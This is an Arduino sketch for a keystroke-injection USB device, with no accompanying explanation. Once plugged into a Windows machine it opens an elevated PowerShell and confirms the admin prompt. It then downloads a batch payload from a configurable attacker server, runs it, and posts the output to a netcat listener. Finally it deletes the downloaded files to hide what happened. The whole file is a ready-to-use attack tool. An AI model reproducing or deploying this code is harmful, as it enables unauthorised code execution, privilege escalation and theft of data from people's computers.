#include <Keyboard.h>
void setup() {
String ipGET = "0.0.0.0:8000"; // GET server ip and port. Format: 0.0.0.0:8000
String ipPOST = "0.0.0.0:8001"; // NetCat listener ip and port. Format: 0.0.0.0:8000
String payloadName = "example.bat"; // Name of payload. Payload must be in the main folder of server.
Keyboard.begin();
delay(1000);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press('r');
delay(10);
Keyboard.releaseAll();
delay(200);
Keyboard.print("powershell");
Keyboard.press(KEY_RETURN);
delay(10);
Keyboard.releaseAll();
delay(2000);
Keyboard.print("powershell Start-Process powershell -Verb runAs");
Keyboard.press(KEY_RETURN);
delay(10);
Keyboard.releaseAll();
delay(3000);
Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(121);
Keyboard.releaseAll();
delay(1000);
Keyboard.print("cd ../../tmp");
Keyboard.press(KEY_RETURN);
delay(10);
Keyboard.releaseAll();
Keyboard.print("Invoke-WebRequest -Uri \"http://" + ipGET + "/" + payloadName + "\" -OutFile \"ex.bat\"");
Keyboard.press(KEY_RETURN);
delay(20);
Keyboard.releaseAll();
Keyboard.print("./ex.bat > result.txt");
delay(10);
Keyboard.press(KEY_RETURN);
delay(20);
Keyboard.releaseAll();
delay(5000);
Keyboard.print("Invoke-RestMethod -Uri \"" + ipPOST + "\" -Method Post -InFile result.txt -UseDefaultCredentials");
delay(10);
Keyboard.press(KEY_RETURN);
delay(20);
Keyboard.releaseAll();
delay(500);
Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(KEY_F4);
delay(100);
Keyboard.releaseAll();
delay(20);
Keyboard.print("cd  ../../tmp");
delay(10);
Keyboard.press(KEY_RETURN);
delay(20);
Keyboard.releaseAll();
delay(500);
Keyboard.print("del ex.bat");
delay(10);
Keyboard.press(KEY_RETURN);
delay(20);
Keyboard.releaseAll();
delay(500);
Keyboard.print("del result.txt");
delay(10);
Keyboard.press(KEY_RETURN);
delay(20);
Keyboard.releaseAll();
delay(100);
Keyboard.print("exit");
delay(10);
Keyboard.press(KEY_RETURN);
delay(20);
Keyboard.releaseAll();
Keyboard.end();
}
void loop() {}